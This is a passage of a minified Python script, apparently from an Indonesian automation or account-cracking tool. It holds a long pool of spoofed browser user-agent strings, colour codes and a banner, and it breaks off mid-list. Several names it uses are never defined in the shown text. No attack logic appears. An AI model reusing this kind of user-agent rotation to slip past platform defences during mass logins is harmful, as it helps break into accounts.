_Ci='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_6) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
_Ch='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0'
_Cg='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36'
_Cf='Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36'
_Ce='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.183 Safari/537.36'
_Cd='Mozilla/5.0 (Windows NT 5.1; rv:45.0) Gecko/20100101 Firefox/45.0'
_Cc='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_7) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.114 Safari/537.36'
_Cb='Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36'
_Ca='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36'
_CZ='Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
_CY='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
_CX='Mozilla/5.0 (X11; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
_CW='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36'
_CV='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36'
_CU='Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_CT='Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0'
_CS='Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
_CR='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36'
_CQ='Mozilla/5.0 (Windows NT 6.1; rv:48.0) Gecko/20100101 Firefox/48.0'
_CP='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
_CO='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_CN='Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
_CM='Mozilla/5.0 (Windows NT 6.2; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'
_CL='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_CK='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0'
_CJ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36'
_CI='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.83 Safari/537.36'
_CH='Mozilla/5.0 (X11; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
_CG='Mozilla/5.0 (X11; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
_CF='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36'
_CE='Mozilla/5.0 (Windows NT 6.2; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0'
_CD='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
_CC='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36'
_CB='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_CA='Mozilla/5.0 (Windows NT 6.3; rv:47.0) Gecko/20100101 Firefox/47.0'
_C9='Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
_C8='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_C7='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0'
_C6='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.183 Safari/537.36'
_C5='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36'
_C4='Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_C3='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:46.0) Gecko/20100101 Firefox/46.0'
_C2='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36'
_C1='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; Trident/4.0)'
_C0='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_B_='Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
_Bz='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:49.0) Gecko/20100101 Firefox/49.0'
_By='Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
_Bx='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
_Bw='Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
_Bv='Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:45.0) Gecko/20100101 Firefox/45.0'
_Bu='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:49.0) Gecko/20100101 Firefox/49.0'
_Bt='Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_Bs='Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.102 Safari/537.36'
_Br='Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.96 Safari/537.36'
_Bq='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0'
_Bp='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36'
_Bo='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36'
_Bn='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)'
_Bm='Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko'
_Bl='Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36'
_Bk='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0'
_Bj='Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36'
_Bi='Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
_Bh='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36'
_Bg='Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36'
_Bf='Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
_Be='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.102 Safari/537.36'
_Bd='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
_Bc='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
_Bb='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0'
_Ba='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36'
_BZ='Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'
_BY='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'
_BX='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/6.0)'
_BW='Mozilla/5.0 (Windows NT 6.1; rv:46.0) Gecko/20100101 Firefox/46.0'
_BV='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:45.0) Gecko/20100101 Firefox/45.0'
_BU='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.102 Safari/537.36'
_BT='Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0'
_BS='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0)'
_BR='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36'
_BQ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
_BP='Mozilla/5.0 (X11; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0'
_BO='Mozilla/5.0 (Windows NT 6.3; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0'
_BN='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.101 Safari/537.36'
_BM='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36'
_BL='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_BK='Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0'
_BJ='Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_BI='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36'
_BH='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'
_BG='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.99 Safari/537.36'
_BF='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_BE='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
_BD='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:48.0) Gecko/20100101 Firefox/48.0'
_BC='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_BB='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_BA='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_B9='Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36'
_B8='Mozilla/5.0 (Windows NT 5.1; Win64; x64; rv:49.0) Gecko/20100101 Firefox/49.0'
_B7='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0'
_B6='Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
_B5='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_B4='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.111 Safari/537.36'
_B3='Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0'
_B2='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.80 Safari/537.36'
_B1='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0'
_B0='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Win64; x64; Trident/4.0)'
_A_='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_Az='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_Ay='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0)'
_Ax='Mozilla/5.0 (Windows NT 5.1; Trident/7.0; rv:11.0) like Gecko'
_Aw='Mozilla/5.0 (Windows NT 6.1; rv:49.0) Gecko/20100101 Firefox/49.0'
_Av='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.185 Safari/537.36'
_Au='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.75 Safari/537.36'
_At='Mozilla/5.0 (Windows NT 5.1; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0'
_As='Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'
_Ar='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.149 Safari/537.36'
_Aq='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:47.0) Gecko/20100101 Firefox/47.0'
_Ap='Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36'
_Ao='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0'
_An='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.106 Safari/537.36'
_Am='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36'
_Al='Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36'
_Ak='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:46.0) Gecko/20100101 Firefox/46.0'
_Aj='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:46.0) Gecko/20100101 Firefox/46.0'
_Ai='Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
_Ah='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_Ag='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36'
_Af='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36'
_Ae='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.117 Safari/537.36'
_Ad='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)'
_Ac='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
_Ab='Mozilla/5.0 (Windows NT 5.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0'
_Aa='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/83.0.4103.101 Safari/537.36'
_AZ='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:50.0) Gecko/20100101 Firefox/50.0'
_AY='Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.127 Safari/537.36'
_AX='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:50.0) Gecko/20100101 Firefox/50.0'
_AW='Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36'
_AV='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.121 Safari/537.36'
_AU='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.89 Safari/537.36'
_AT='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Win64; x64; Trident/6.0)'
_AS='Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_AR='Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.120 Safari/537.36'
_AQ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML like Gecko) Chrome/81.0.4044.138 Safari/537.36'
_AP='Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.125 Safari/537.36'
_AO='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:48.0) Gecko/20100101 Firefox/48.0'
_AN='Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.96 Safari/537.36'
_AM='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:47.0) Gecko/20100101 Firefox/47.0'
_AL='Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
_AK='\x1b[2;34m'
_AJ='\x1b[2;31m'
_AI='\x1b[38;5;231m'
_AH='\x1b[38;5;216m'
_AG='\x1b[38;5;220m'
_AF='mobile'
_AE='cookie'
_AD='8.1.0'
_AC=' ╸╸╸╸╸╸╸╸╸╸╸╸╸╸  '
_AB='\x1b[1;97m'
_AA='\x1b[38;5;208m'
_A9='user-agent'
_A8='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.2; Trident/5.0)'
_A7='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0'
_A6='Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.99 Safari/537.36'
_A5='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'
_A4='Mozilla/5.0 (X11; Linux i686; rv:49.0) Gecko/20100101 Firefox/49.0'
_A3='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0) Gecko/20100101 Firefox/45.0'
_A2='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:45.0) Gecko/20100101 Firefox/45.0'
_A1='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0'
_A0='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.110 Safari/537.36'
_z='Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0'
_y='Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko'
_x='Mozilla/5.0 (Windows NT 5.1; rv:51.0) Gecko/20100101 Firefox/51.0'
_w='Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
_v='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/84.0.4147.135 Safari/537.36'
_u='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:48.0) Gecko/20100101 Firefox/48.0'
_t='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)'
_s='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/80.0.3987.132 Safari/537.36'
_r='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 5.1; Win64; x64; Trident/6.0)'
_q='Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.78 Safari/537.36'
_p='Mozilla/5.0 (X11; Linux x86_64; rv:50.0) Gecko/20100101 Firefox/50.0'
_o='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:47.0) Gecko/20100101 Firefox/47.0'
_n='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'
_m='Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
_l='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:46.0) Gecko/20100101 Firefox/46.0'
_k='Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0'
_j='Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0'
_i='Mozilla/5.0 (Windows NT 5.1; rv:47.0) Gecko/20100101 Firefox/47.0'
_h='Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0'
_g='Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:51.0) Gecko/20100101 Firefox/51.0'
_f='Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.3; WOW64; Trident/4.0)'
_e='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 5.1; WOW64; Trident/5.0)'
_d='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Win64; x64; Trident/6.0)'
_c='Mozilla/5.0 (X11; Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML like Gecko) Chrome/86.0.4240.111 Safari/537.36'
_b='Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0'
_a='Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.3; Win64; x64; Trident/6.0)'
_Z='Mozilla/5.0 (X11; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0'
_Y='\x1b[2;35m'
_X='\x1b[2;32m'
_W='\x1b[1;30m'
_V='12'
_U='11'
_T='10'
_S='\x1b[1;36m'
_R='Mozilla/5.0 (X11; Linux i686 on x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'
_Q='Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'
_P='Mozilla/5.0 (X11; Linux i686 on x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'
_O='Mozilla/5.0 (X11; Linux i686; rv:51.0) Gecko/20100101 Firefox/51.0'
_N='Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)'
_M='Mozilla/5.0 (X11; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/85.0.4183.81 Safari/537.36'
_D='clear'
#-----------------[ اتصالات ]--------------
import sys,time
def k(z):
	for e in z:sys.stdout.write(e);sys.stdout.flush();time.sleep(.006)
os.system(_D)
pretty.install()
CON=sol()
os.system(_D)
cetak(nel('\t• Sedang Menginstall Modul Requests •'))
pretty.install()
CON=sol()
ugen2=[_AL,_AM,_AN,_AO,_AP,_AQ,_AR,_AS,_AT,_Z,_AU,_a,_AV,_b,_AW,_AX,_AY,_c,_AZ,_Aa,_Ab,_d,_Ac,_Ad,_e,_Ae,_f,_Af,_Ag,_Ah,_Ai,_Aj,_Ak,_Al,_Am,_An,_Ao,_Ap,_Aq,_g,_h,_Ar,_i,_a,_As,_At,_Au,_M,_Av,_Aw,_Ax,_j,_k,_Ay,_Az,_l,_A_,_B0,_B1,_m,_B2,_N,_n,_B3,_o,_O,_g,_B4,_p,_q,_B5,_B6,_B7,_f,_B8,_B9,_BA,_BB,_BC,_BD,_r,_p,_BE,_BF,_BG,_BH,_BI,_BJ,_BK,_N,_BL,_s,_j,_BM,_BN,_BO,_BP,_BQ,_BR,_t,_BS,_BT,_BU,_BV,_u,_BW,_v,_w,_BX,_BY,_x,_BZ,_Ba,_P,_Z,_s,_Bb,_Q,_Bc,_v,_y,_Bd,_Be,_Bf,_Bg,_o,_Bh,_Bi,_M,_Bj,_Bk,_Bl,_R,_Bm,_Bn,_Bo,_Bp,_z,_O,_t,_Bq,_Br,_A0,_Bs,_Bt,_A1,_Bu,_Bv,_Bw,_Bx,_By,_Bz,_B_,_m,_C0,_R,_C1,_C2,_C3,_C4,_C5,_A2,_C6,_C7,_C8,_C9,_M,_CA,_Q,_CB,_u,_CC,_A3,_A3,_CD,_CE,_CF,_CG,_k,_A4,_CH,_CI,_CJ,_x,_CK,_A5,_CL,_R,_A6,_A2,_O,_w,_h,_CM,_CN,_CO,_CP,_A7,_P,_CQ,_CR,_c,_CS,_d,_CT,_CU,_b,_N,_CV,_A0,_n,_CW,_Q,_CX,_CY,_CZ,_Ca,_Cb,_z,_Cc,_Cd,_Ce,_Cf,_Cg,_Ch,_Ci,_A1,_P,_Cj,_Ck,_Cl,_Cm,_Cn,_A6,_Co,_l,_y,_Cp,_i,_Cq,_A5,_A8,_Cr,_Cs,_Ct,_Cu,_Cv,_Cw,_Cx,_Cy,_e,_Cz,_C_,_A8,_D0,_D1,_D2,_D3,_r,_D4,_D5,_A4,_D6,_q,_D7,_D8,_D9,_DA,_DB,_A7,_DC]
ugen=[_AL,_AM,_AN,_AO,_AP,_AQ,_AR,_AS,_AT,_Z,_AU,_a,_AV,_b,_AW,_AX,_AY,_c,_AZ,_Aa,_Ab,_d,_Ac,_Ad,_e,_Ae,_f,_Af,_Ag,_Ah,_Ai,_Aj,_Ak,_Al,_Am,_An,_Ao,_Ap,_Aq,_g,_h,_Ar,_i,_a,_As,_At,_Au,_M,_Av,_Aw,_Ax,_j,_k,_Ay,_Az,_l,_A_,_B0,_B1,_m,_B2,_N,_n,_B3,_o,_O,_g,_B4,_p,_q,_B5,_B6,_B7,_f,_B8,_B9,_BA,_BB,_BC,_BD,_r,_p,_BE,_BF,_BG,_BH,_BI,_BJ,_BK,_N,_BL,_s,_j,_BM,_BN,_BO,_BP,_BQ,_BR,_t,_BS,_BT,_BU,_BV,_u,_BW,_v,_w,_BX,_BY,_x,_BZ,_Ba,_P,_Z,_s,_Bb,_Q,_Bc,_v,_y,_Bd,_Be,_Bf,_Bg,_o,_Bh,_Bi,_M,_Bj,_Bk,_Bl,_R,_Bm,_Bn,_Bo,_Bp,_z,_O,_t,_Bq,_Br,_A0,_Bs,_Bt,_A1,_Bu,_Bv,_Bw,_Bx,_By,_Bz,_B_,_m,_C0,_R,_C1,_C2,_C3,_C4,_C5,_A2,_C6,_C7,_C8,_C9,_M,_CA,_Q,_CB,_u,_CC,_A3,_A3,_CD,_CE,_CF,_CG,_k,_A4,_CH,_CI,_CJ,_x,_CK,_A5,_CL,_R,_A6,_A2,_O,_w,_h,_CM,_CN,_CO,_CP,_A7,_P,_CQ,_CR,_c,_CS,